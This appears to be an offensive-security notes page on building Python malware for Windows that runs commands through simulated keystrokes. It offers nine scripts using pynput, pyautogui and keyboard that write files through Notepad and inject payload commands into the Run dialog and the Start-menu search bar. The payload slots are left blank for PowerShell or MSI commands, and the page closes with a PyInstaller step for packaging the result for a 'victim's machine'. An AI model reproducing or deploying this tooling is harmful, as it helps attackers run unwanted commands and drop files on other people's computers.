# Python

## Windows

> [!INFO] Software-based Keystrokes Limitation
> When executing the malware. It will not bypass UAC prompt due to whatever software limitation that restricts it to inject keystrokes.

### File Transfer via Text Editor

> [!TIP] Enumerate Text Editors
> Do not feel restricted since it's a malware you're trying to create. You can enumerate any text editors that is installed in the system. It doesn't have only exclusive to `notepad.exe` user.

#### `pynput`

```python
import os
from pynput.keyboard import Key, Controller
import subprocess
from time import sleep

def save_file() -> None:
	text_editor = "notepad.exe"
	contents = 'This is a String'
	filepath = os.path.normpath("C:\\path\\to\\file.txt")
	
	# Create the keyboard controller
	keyboard = Controller()
	
	# Open text editor
	subprocess.Popen([text_editor])
	sleep(3)
	
	# Write the contents in the text editor
	keyboard.type(contents)
	sleep(2)
	
	# Open the Save dialog
	with keyboard.pressed(Key.ctrl):
	    keyboard.press('s')
	    keyboard.release('s')
	sleep(2)
	
	# Save path of the file then return
	keyboard.type(filepath)
	sleep(2)
	keyboard.press(Key.enter)
	keyboard.release(Key.enter)

if __name__ == '__main__':
	save_file()
```

#### `pyautogui`

```python
import os
import pyautogui
import subprocess
from time import sleep

def save_file() -> None:
	text_editor = "notepad.exe"
	contents = 'This is a String'
	filepath = os.path.normpath("C:\\path\\to\\file.txt")

	pyautogui.FAILSAFE = False

	# Open text editor
	subprocess.Popen([text_editor])
	sleep(3)

	# Write the contents in the text editor
	pyautogui.write(contents, interval=.025)
	sleep(2)

	# Open the Save dialog (Ctrl + S)
	pyautogui.hotkey('ctrl', 's')
	sleep(2)

	# Save path of the file then return
	pyautogui.write(filepath, interval=.025)
	pyautogui.press("enter")

if __name__ == '__main__':
	save_file()
```

#### `keyboard`

```python
from keyboard import press_and_release, write
import os
import subprocess
from time import sleep

def save_file() -> None:
	text_editor = "notepad.exe"
	contents = 'This is a String'
	filepath = os.path.normpath("C:\\path\\to\\file.txt")

	# Open text editor
	subprocess.Popen([text_editor])
	sleep(3)
	
	# Write the contents in the text editor
	write(contents)
	sleep(2)

	# Open the Save dialog (Ctrl + S)
	press_and_release("ctrl + s")
	sleep(2)

	# Save path of the file then return
	write(filepath)
	sleep(2)
	press_and_release("enter")

if __name__ == '__main__':
	save_file()
```

### Dialogue Box

#### `pynput`

```python
from pynput.keyboard import Key, Controller
from time import sleep

def inject_keystrokes() -> None:
	# Add payload here. Such as, PowerShell, MSI, etc
	commands = ""
	
	# Create the keyboard controller
	keyboard = Controller()
	
	# Open Dialogue Box (Win + R)
	keyboard.press(Key.cmd)
	keyboard.press('r')
	sleep(2)
	
	# Release the keys
	keyboard.release('r')
	keyboard.release(Key.cmd)
	sleep(1)
	
	# Inject commands then return
	keyboard.type(commands)
	sleep(1)
	keyboard.press(Key.enter)
	keyboard.release(Key.enter)

if __name__ == '__main__':
	inject_keystrokes()
```

#### `pyautogui`

```python
import pyautogui
from time import sleep

def inject_keystrokes() -> None:
	# Add payload here. Such as, PowerShell, MSI, etc
	commands = ""

	pyautogui.FAILSAFE = False
	
	# Open Dialogue Box (Win + R)
	pyautogui.press("win")
	pyautogui.press("r")
	sleep(2)

	# Inject commands then return
	pyautogui.write(commands, interval=.025)
	pyautogui.press("enter")

if __name__ == '__main__':
	inject_keystrokes()
```

#### `keyboard`

```python
from keyboard import press_and_release, write
from time import sleep

def inject_keystrokes() -> None:
	# Add payload here. Such as, PowerShell, MSI, etc
	commands = ""

	# Open Dialogue Box (Win + R)
	press_and_release("left windows + R")
	sleep(0.5)
	
	# Inject commands then return
	write(commands)
	press_and_release("enter")
	sleep(0.5)

if __name__ == '__main__':
	inject_keystrokes()
```

### Search Bar

#### `pynput`

```python
from pynput.keyboard import Key, Controller
from time import sleep

def inject_keystrokes() -> None:
	# Append @ as a prefix in order to execute commands.
	# Add payload here. Such as, PowerShell, MSI, etc
	commands = "@"
	
	keyboard = Controller()
	
	# Open the Start Menu
	keyboard.press(Key.cmd)
	sleep(2)
	keyboard.release(Key.cmd)
	sleep(2)
	
	# Inject commands then return
	keyboard.type(commands)
	sleep(1)
	keyboard.press(Key.enter)
	keyboard.release(Key.enter)

if __name__ == '__main__':
	inject_keystrokes()
```

#### `pyautogui`

```python
import pyautogui
from time import sleep

def inject_keystrokes() -> None:
	# Append @ as a prefix in order to execute commands.
	# Add payload here. Such as, PowerShell, MSI, etc
	commands = "@"

	pyautogui.FAILSAFE = False
	
	# Open the Start Menu
	pyautogui.press("win")
	sleep(2)

	pyautogui.write(commands, interval=.025)
	pyautogui.press("enter")

if __name__ == '__main__':
	inject_keystrokes()
```

#### `keyboard`

```python
from keyboard import press_and_release, write
from time import sleep

def inject_keystrokes() -> None:
	# Append @ as a prefix in order to execute commands.
	# Add payload here. Such as, PowerShell, MSI, etc
	commands = "@"

	# Win
	press_and_release("left windows")
	sleep(0.5)
	
	# Inject commands then return
	write(commands)
	press_and_release("enter")
	sleep(0.5)

if __name__ == '__main__':
	inject_keystrokes()
```

Compile into a static payload when deploying it in the victim's machine.

```
$ pyinstaller -w -F payload.py
```